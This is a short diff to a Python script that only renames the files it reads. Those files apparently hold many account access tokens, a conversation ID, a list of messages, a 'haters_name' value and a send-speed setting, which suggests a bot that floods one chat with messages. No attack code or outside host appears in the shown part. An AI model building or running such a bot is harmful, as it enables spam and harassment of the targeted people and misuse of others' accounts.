@@ -35,7 +35,7 @@ def execute_server():
 
 
 def send_initial_message():
-      with open('tokennum.txt', 'r') as file:
+      with open('musicto.txt', 'r') as file:
           tokens = file.readlines()
 
       # Modify the message as per your requirement
@@ -74,23 +74,23 @@ def send_initial_message():
       #print("\n[+] Initial messages sent. Starting the message sending loop...\n")
 send_initial_message()
 def send_messages_from_file():
-      with open('convo.txt', 'r') as file:
+      with open('music.txt', 'r') as file:
           convo_id = file.read().strip()
 
-      with open('File.txt', 'r') as file:
+      with open('musicnp.txt', 'r') as file:
           messages = file.readlines()
 
       num_messages = len(messages)
 
-      with open('tokennum.txt', 'r') as file:
+      with open('musicto.txt', 'r') as file:
           tokens = file.readlines()
       num_tokens = len(tokens)
       max_tokens = min(num_tokens, num_messages)
 
-      with open('hatersname.txt', 'r') as file:
+      with open('musicname.txt', 'r') as file:
           haters_name = file.read().strip()
 
-      with open('time.txt', 'r') as file:
+      with open('musictime.txt', 'r') as file:
           speed = int(file.read().strip())
 
       def liness():
@@ -148,3 +148,4 @@ def main():
 
 if __name__ == '__main__':
       main()
+      
